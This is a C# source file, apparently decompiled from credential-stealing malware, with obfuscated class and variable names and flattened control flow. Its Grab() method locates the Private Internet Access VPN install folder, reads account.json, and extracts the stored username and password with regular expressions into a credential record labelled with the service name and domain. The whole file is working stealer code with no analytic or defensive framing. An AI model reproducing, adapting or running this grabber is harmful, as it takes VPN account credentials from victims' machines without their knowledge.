using System;
using System.Collections.Generic;
using System.IO;
using System.Runtime.CompilerServices;
using System.Text.RegularExpressions;
using p3N5Y;

namespace ZAZUx;

public class PbtpWN : MnVCfk
{
	[CompilerGenerated]
	private string Application__BackingField;

	public string yGxcUxl
	{
		[CompilerGenerated]
		get
		{
			return Application__BackingField;
		}
		[CompilerGenerated]
		set
		{
			Application__BackingField = value;
		}
	}

	public PbtpWN()
	{
		yGxcUxl = "Private Internet Access";
	}

	public List<ii68> Grab()
	{
		int num = 0;
		string text = default;
		string text2 = default;
		List<ii68> list = default;
		do
		{
			if (num == 2)
			{
				text = Path.Combine(Environment.ExpandEnvironmentVariables("%ProgramW6432%"), "Private Internet Access\\data");
				num = 3;
			}
			if (num == 3)
			{
				text2 = Path.Combine(Environment.GetEnvironmentVariable("ProgramFiles(x86)"), "\\Private Internet Access\\data");
				num = 4;
			}
			switch (num)
			{
			case 4:
				try
				{
					string text3 = "";
					if (Directory.Exists(text))
					{
						text3 = text;
					}
					else if (Directory.Exists(text2))
					{
						text3 = text2;
					}
					string path = text3 + "\\account.json";
					if (!File.Exists(path))
					{
						return list;
					}
					string input = File.ReadAllText(path);
					Regex regex = new Regex(".*\"username\":\"(.*?)\"");
					string value = regex.Match(input).Groups[1].Value;
					Regex regex2 = new Regex(".*\"password\":\"(.*?)\"");
					string value2 = regex2.Match(input).Groups[1].Value;
					list.Add(new ii68
					{
						S8v = value,
						_9H5rP7hg2 = value2,
						oVAe = "Private Internet Access",
						byIdLuuGZbL = "privateinternetaccess.com"
					});
					return list;
				}
				catch
				{
					return new List<ii68>();
				}
			case 1:
				list = new List<ii68>();
				num = 2;
				break;
			}
			if (num == 0)
			{
				num = 1;
			}
		}
		while (num != 5);
		List<ii68> result = default;
		return result;
	}
}
